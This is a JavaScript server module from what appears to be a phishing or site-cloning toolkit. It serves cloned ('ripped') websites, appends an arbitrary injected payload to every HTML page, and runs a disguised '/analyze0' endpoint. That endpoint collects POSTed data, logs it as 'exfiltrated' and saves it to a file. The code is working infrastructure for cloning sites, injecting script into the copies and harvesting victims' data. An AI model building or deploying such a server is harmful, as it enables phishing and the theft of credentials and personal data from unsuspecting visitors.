import fs from 'fs/promises';
import {performance} from 'perf_hooks';
import {compress} from './compression.js';

import {Logger} from "./../util/logger.js";
import {Ansi} from "./../util/ansi.js";

let inject_string = false;
const files = {};
const EXFIL_LOG = '../data/exfiltration/log.jsonl';
const EXFIL_PATH = '/analyze0';

/**
 * Serves a ripped site from the browser/ripped folder or an arbitrary folder.
 * @param host the interface to bind to.
 * @param port the port to listen to.
 * @param resources the directory to serve.
 * @param inject payload buffer for injection.
 * @param tls use https for the server.
 * @param compression algorithm to use.
 * @param version {Number} indicating whether to use http/1 or 2.
 * @returns {Promise<void>}
 */
export async function serve(host, port, resources, inject, tls, compression, version) {
    resources = handle_resources_args(resources);
    inject_string = inject;
    Logger.info(`using http/${Ansi.green(version)} and https is ${tls ? Ansi.green("enabled") : Ansi.red("disabled")}..`);
    Logger.info(`payload inject ${(inject) ? Ansi.green("enabled") : Ansi.red('disabled')}.`);
    Logger.info(`using compression ${compression ? Ansi.green(compression) : Ansi.yellow('none')}.`);
    Logger.info(`loading files from '${Ansi.cyan(resources)}' into ${Ansi.red('memory')}..`);
    await load_files_into_memory(resources, compression);
    await start_server(host, port, tls, version);
}

async function start_server(host, port, tls, version) {
    let callback = () => Logger.info(`${Ansi.green('server')} listening on ${Ansi.cyan(host)} port ${Ansi.cyan(port)}.`);
    import(`./http${version}.js`).then(async (server) => {
        let options = {
            tls: tls,
            key: (tls) ? await fs.readFile('server/keys/server.key') : null,
            cert: (tls) ?  await fs.readFile('server/keys/server.pem') : null
        }
        server.create(options, listener).listen(port, host, callback);
    }).catch((e) => {
        Logger.error(e);
        process.exit(1);
    });
}

async function load_files_into_memory(resources, compression) {
    // load dirtree into memory for performance and security.
    for await (let entry of walkdir(resources)) {
        let webpath = entry.path.replace(resources, '/');
        files[webpath.toLowerCase()] = {
            data: await load_file(entry.path, compression),
            path: entry.path,
            compression: compression
        };
        if (is_html(webpath)) {
            let alias = webpath.replace(/(?<=.+?)\/?(index.html)/gi, '');
            files[alias] = files[webpath];
        }
        Logger.info(`\t${Ansi.cyan(webpath.slice(-64))}`);
    }
}

async function load_file(path, compression) {
    let data = await fs.readFile(path);
    if (is_html(path) && inject_string) {
        // compress the payload if applicable.
        data += inject_string;
    }
    data = await compress(data, compression);
    return data;
}

function handle_resources_args(resources) {
    if (!resources.includes('/')) {
        resources = `../data/ripped/${resources}`;
    }
    if (!resources.endsWith('/')) {
        resources += '/';
    }
    return resources;
}

function is_html(file) {
    return sniff(file.path ?? file) === 'text/html';
}

function sniff(path) {
    if (path.endsWith('.svg')) return "image/svg+xml";
    if (path.endsWith('.png')) return "image/png";
    if (path.endsWith('.html')) return "text/html";
    if (path.endsWith('.css')) return "text/css";
    if (path.endsWith('.json')) return "application/json";
    return '';
}

const listener = async (req, res) => {
    let start = performance.now();
    let url = req.url.split('?')[0].toLowerCase();
    let callback = () => access(req, res, url, (performance.now() - start).toFixed(1));

    if (url.length > 1) {
        // policy: drop trailing slashes to treat endpoints as files not directories.
        url = url.replace(/\/$/, '');
    }

    if (url === EXFIL_PATH) {
        handle_exfiltration(req, res, callback);
    } else if (files[url]) {
        respond(res, files[url], callback)
    } else {
        missing(res, callback);
    }
};

function respond(res, file, callback, status = 200) {
    let type = file.type ?? sniff(file.path);
    res.writeHead(status, {
        "Content-Type": type,
        "Cache-Control": (type === 'text/html') ? "no-cache, must-revalidate" : "public, max-age=16400, immutable",
        "Content-Encoding": file.compression ?? '',
        "expires": header_date(3600 * 4),
        "modified": header_date(-process.uptime()),
    });
    res.write(file.data);
    res.end(callback);
}

function handle_exfiltration(req, res, callback) {
    let body = [];
    req.on('data', (chunk) => body.push(chunk))
    req.on('end', async () => {
        body.push(Buffer.from('\n', 'utf-8'));
        body = Buffer.concat(body);

        respond(res, {data: '{}', type: 'application/json'}, callback);
        Logger.info(`${Ansi.yellow('exfiltrated')} -> ${Ansi.red(body.toString().trim())}`)
        await fs.mkdir(EXFIL_LOG.substring(0, EXFIL_LOG.lastIndexOf('/')), {recursive: true});
        await fs.appendFile(EXFIL_LOG, body, 'utf8');
    })
}

function header_date(delta_seconds) {
    let date = new Date();
    date.setSeconds(date.getSeconds() + delta_seconds);
    return date.toUTCString();
}

function missing(res, callback) {
    let file = files['/404/index.html'];
    respond(res, {
        path: file?.path ?? '/404/index.html',
        data: file ? file.data : 'page not found',
        compression: file?.compression ?? ''
    }, callback, 404);
}

function access(req, res, url, time) {
    Logger.info(`${Ansi.red(req.method)} ${Ansi.yellow(res.statusCode)} [${Ansi.red(time + 'ms')}] -` +
        ` ${Ansi.cyan(url.slice(-48))} - ${req.headers['user-agent']?.substring(0, 32)}..`);
}

async function* walkdir(path = './') {
    const list = await fs.readdir(path, {withFileTypes: true});

    for (let item of list) {
        if (item.isDirectory()) {
            yield* walkdir(`${path}${item.name}/`)
        } else {
            yield {...item, path: `${path}${item.name}`}
        }
    }
}